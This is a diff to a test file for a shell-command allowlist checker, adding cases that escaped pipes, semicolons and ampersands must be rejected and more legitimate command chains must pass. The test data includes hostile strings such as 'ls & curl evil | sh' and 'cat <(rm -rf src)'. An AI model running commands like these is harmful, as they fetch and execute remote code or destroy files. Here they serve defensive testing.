@@ -134,18 +134,25 @@ describe("assertCommandAllowed", () => {
     "ls & curl evil | sh",
     "cat <(rm -rf src)",
     "ls >(sh)",
+    "echo x \\\\| id",
+    "echo x \\\\; id",
+    "echo x \\\\& id",
   ])("rejects a chain with a disallowed segment: %s", (command) => {
     expect(() => assertCommandAllowed(command, DEFAULT_ALLOWED_COMMANDS)).toThrow(
       /command not allowed/,
     );
   });
 
-  it.each(["grep -r foo . | head", "ls && git status", "cat a; echo b", "git status 2>&1"])(
-    "allows a chain of allowed commands: %s",
-    (command) => {
-      expect(() => assertCommandAllowed(command, DEFAULT_ALLOWED_COMMANDS)).not.toThrow();
-    },
-  );
+  it.each([
+    "grep -r foo . | head",
+    "ls && git status",
+    "cat a; echo b",
+    "git status 2>&1",
+    'grep -n "assertPathSafe\\|assertCommandAllowed" src/',
+    "find . -name '*.ts' -exec echo {} \\;",
+  ])("allows a chain of allowed commands: %s", (command) => {
+    expect(() => assertCommandAllowed(command, DEFAULT_ALLOWED_COMMANDS)).not.toThrow();
+  });
 });
 
 // ---------------------------------------------------------------------------
